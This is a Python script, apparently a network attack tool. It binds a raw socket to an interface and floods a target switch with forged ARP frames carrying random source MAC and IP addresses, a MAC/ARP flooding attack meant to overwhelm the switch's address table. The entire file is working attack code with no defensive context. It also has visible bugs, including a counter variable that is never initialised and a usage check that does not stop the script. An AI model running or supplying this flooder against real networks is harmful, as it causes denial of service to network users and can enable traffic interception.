#!/usr/bin/python

import sys
import socket
import time
import random
import binascii

from socket import  AF_PACKET, SOCK_RAW

charset = [chr(i) for i in range(ord('0'),ord('9')+1)]
charset.extend([chr(i) for i in range(ord('a'),ord('f')+1)])

def random_mac():
    return ':'.join([''.join([charset[random.randint(0,len(charset)-1)] for _ in range(2)]) for _ in range(6)])

def random_ip():
    return ''.join([charset[random.randint(0,len(charset)-1)] for _ in range(8)])


if len(sys.argv)<2:
    print("Usage : "+sys.argv[0]+" [target switch mac] [interface connect network]")

interface = sys.argv[2]

dst_mac_address = sys.argv[1]
broadcast_mac = 'ff:ff:ff:ff:ff:ff'
dst_ip = '0a000001'

s = socket.socket(AF_PACKET, SOCK_RAW)
s.bind((interface, 0))

t = []
while (True):
    if len(t)<100000:
        if random.randint(0,8) == 1 and len(t)>1:
            src_ip,src_mac_address = t[random.randint(0,len(t)-1)]
        else:
            src_mac_address = random_mac()
            src_ip = random_ip()
    else:
        if random.randint(0,100) == 10:
            t[random.randint(0,99999)] = (random_ip(), random_mac())
        src_ip,src_mac_address = t[cur]
        cur += 1
    eth_pkt = broadcast_mac.replace(':','')+dst_mac_address.replace(':','')+"08060001080006040001"+src_mac_address.replace(':','')+src_ip+"000000000000"+dst_ip
    eth_pkt = binascii.unhexlify(eth_pkt)

    if len(t)<100000:
        t.append((src_ip,src_mac_address))

    s.send(eth_pkt)
    time.sleep(0.001)
